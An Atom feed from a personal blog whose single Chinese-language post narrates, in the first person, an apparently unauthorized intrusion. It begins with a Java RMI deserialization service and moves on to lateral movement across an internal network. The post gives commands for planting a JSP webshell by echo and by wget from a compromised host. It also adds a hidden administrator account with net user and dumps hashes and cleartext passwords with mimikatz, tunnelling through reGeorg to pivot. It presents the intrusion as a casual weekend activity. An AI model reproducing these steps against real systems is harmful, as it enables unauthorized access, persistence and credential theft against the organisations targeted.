<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hone</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="OneHone.github.io/"/>
  <updated>2018-01-27T19:33:03.888Z</updated>
  <id>OneHone.github.io/</id>
  
  <author>
    <name>Hone</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>JAVARMI漏洞之旅</title>
    <link href="OneHone.github.io/2018/01/27/JAVARMI%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%97%85/"/>
    <id>OneHone.github.io/2018/01/27/JAVARMI漏洞之旅/</id>
    <published>2018-01-27T12:42:55.000Z</published>
    <updated>2018-01-27T19:33:03.888Z</updated>
    
    <content type="html"><![CDATA[<p>博客刚搭建不久，有些美工还没做。<strong>##其实我不想在搞了，搭建个博客麻烦得要死。</strong></p><p>今天周末天气不错，兜兜转转也不懂要做什么。最近在研究RMI反序列化漏洞，就写一片文章吧。</p><h2 id="突破口"><a href="#突破口" class="headerlink" title="突破口"></a>突破口</h2><p>在一次<code>nmap</code>扫描过程中发现了目标机子8100端口存在<code>java RMI</code>服务<br><img src="/images/RMI1.PNG" alt=""><br>于是用<code>attackRMI.jar</code>链接该端口，成功回显系统信息 执行<code>cat /proc/version</code>  <code>id</code>  命令<br><img src="/images/RMI2.PNG" alt=""></p><h2 id="写马失败"><a href="#写马失败" class="headerlink" title="写马失败"></a>写马失败</h2><p><code>Liunx</code>的版本号比较低，<code>User</code>权限，<code>ifconfig</code>：10.xx.xx.13内网机子，对系统的基本信息了解之后，接下来就尝试着<code>echo</code>写一句话到<code>web</code>路径下（用菜刀连接，方便操作，因为使用<code>attackRMI.jar</code>只能在当前目录下操作，不能<code>cd</code>到别的目录），<code>echo 一句话&gt;&gt;/xxx/xxx/tomcat/webapps/root/xxx.jsp</code>（<code>web</code>路径疯狂ls才找到的） 运行完之后发现文件是创建了，但是字节为<code>0</code> 经过一番尝试之后发现<code>echo</code>命令用不了。</p><p>不能写内容到文件里去，于是想到了<code>wget</code>命令，<code>wget http://xxx.xxx.xxx/xxx.jsp -O /xxx/xxx/tomcat/webapps/root/xxx.jsp</code>（其中肉鸡的地址是<code>http</code> 马名字为<code>xxx.jsp</code>），运行后发现并没有成功写入到文件，排查原因发现该机子根本就不通外网。内网机子做了端口转发。</p><p>马儿出不了，那就翻翻有啥利用的东西。在经过疯狂的<code>ls</code>之后找到了几个数据库密码：<br><img src="/images/RMI3.PNG" alt=""></p><h2 id="转机"><a href="#转机" class="headerlink" title="转机"></a>转机</h2><p>既然突破不了，为何不去扫扫C段？果然在其同网段的一台机子的8800端口发现了同样的漏洞：<br><img src="/images/RMI4.PNG" alt=""><br>说干就干，运气不错，系统权限<br><img src="/images/RMI5.PNG" alt=""><br>windows 2008 32位 没有域<br><img src="/images/RMI6.PNG" alt=""></p><p><code>netstat -ano</code>对方开了3389<br><img src="/images/RMI7.PNG" alt=""><br>添加用户<br><code>net user admln admin /add &amp; net localgoup administrators admln /add</code><br>成功添加用户之后用<code>mstsc</code>命令远程链接发现报错：<br><img src="/images/RMI8.PNG" alt=""><br>原来该机子没有把自己的3389端口映射出来，不好的情况发生了，这台和之前的一样不能通外网，正当想办法的时候，小伙伴在该C段拿下了台<code>liunx</code>的机子，通过端口漏洞<code>jdwp</code>，过程大致说下，该漏洞是远程执行命令的，然后通过执行命令找到web服务的根路径，向其写入一句话。乌云有篇关于<code>jdwp</code>的文章，有兴趣的去看下。</p><h2 id="内网游游"><a href="#内网游游" class="headerlink" title="内网游游"></a>内网游游</h2><p>在已拿下的<code>liunx</code>机子上安装了<code>reGeorg</code>代理，然后通过代理远程链接之前的win 08机子</p><p><img src="/images/RMI9.PNG" alt=""></p><p>用到<code>mimikatz</code>获取管理员的哈希及明文密码<br><img src="/images/RMI10.PNG" alt=""></p><p>之前写马失败的那台，通过<code>wget</code>到内网机子里获取到一句话,也成功拿下了。</p><p><img src="/images/RMI11.PNG" alt=""></p><p>内网很大，这里就不继续写下去了。</p><p>刮好大的风啊，准备要下雨了，走人走人。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;博客刚搭建不久，有些美工还没做。&lt;strong&gt;##其实我不想在搞了，搭建个博客麻烦得要死。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;今天周末天气不错，兜兜转转也不懂要做什么。最近在研究RMI反序列化漏洞，就写一片文章吧。&lt;/p&gt;
&lt;h2 id=&quot;突破口&quot;&gt;&lt;a href=&quot;#突破
      
    
    </summary>
    
      <category term="web安全" scheme="OneHone.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="RMI漏洞" scheme="OneHone.github.io/tags/RMI%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="内网渗透" scheme="OneHone.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
</feed>
